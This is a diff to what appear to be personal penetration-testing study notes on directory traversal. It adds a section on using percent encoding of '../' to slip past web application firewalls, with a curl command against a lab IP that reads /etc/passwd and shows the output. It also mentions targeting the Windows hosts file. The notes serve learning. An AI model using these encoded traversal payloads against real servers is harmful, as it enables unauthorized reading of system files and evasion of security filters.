@@ -25,3 +25,23 @@ If the web application is not configured to sanitize user input, then we can exp
 On Linux web servers, the webroot is usually `/var/www`. But on Windows-based web servers like IIS,  the web root is usually `C:\Inetpub\wwwroot`. 
 
 Additionally, to prove exploitability on a windows web server, you might try to traverse to a file like `C:\Windows\System32\drivers\etc\hosts` instead of `/etc/passwd` (which is strictly a Linux file). 
+## Character Encoding
+Since `../../` is the most recognizable way to test for directory traversal, web application and web app firewalls are usually configured to block it in a query. To get around this, we can use *URL encoding* ("Percent encoding"). 
+### Percent Encoding
+Percent encoding is primarily used to encode characters so they can easily be transmitted over the internet. When the web server or web browser receives characters which are URL encoded, its configured to be able to decode them into plaintext. 
+
+This can be leveraged for malicious purposes like bypassing web application firewalls. For example, if you want the *plaintext* request `cgi-bin/../../../../../etc/passwd` to be processed by they server, then you can URL encode it in the hopes the server and/or firewall let it pass:
+```bash
+# curl http://192.168.50.16/cgi-bin/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd
+
+root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+sys:x:3:3:sys:/dev:/usr/sbin/nologin
+...
+_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
+alfred:x:1000:1000::/home/alfred:/bin/bash
+```
+
+> [!Resources]
+> - My [own notes](https://github.com/trshpuppy/obsidian-notes) linked throughout the text.
